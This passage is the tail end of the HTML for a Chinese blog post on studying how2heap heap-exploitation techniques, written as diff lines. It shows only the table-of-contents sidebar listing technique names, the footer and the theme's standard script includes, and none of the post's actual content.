class="nav-text">house_of_lore</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#overlapping-chunks1"><span class="nav-number">8.</span> <span class="nav-text">overlapping_chunks1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#overlapping-chunks-2"><span class="nav-number">9.</span> <span class="nav-text">overlapping_chunks_2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-force"><span class="nav-number">10.</span> <span class="nav-text">house_of_force</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsorted-bin-attack"><span class="nav-number">11.</span> <span class="nav-text">unsorted_bin_attack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-einherjar"><span class="nav-number">12.</span> <span class="nav-text">house_of_einherjar</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-orange"><span class="nav-number">13.</span> <span class="nav-text">house_of_orange</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2017/09/29/how2heap学习/';
+          this.page.identifier = '2017/09/29/how2heap学习/';
+          this.page.title = 'how2heap学习';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
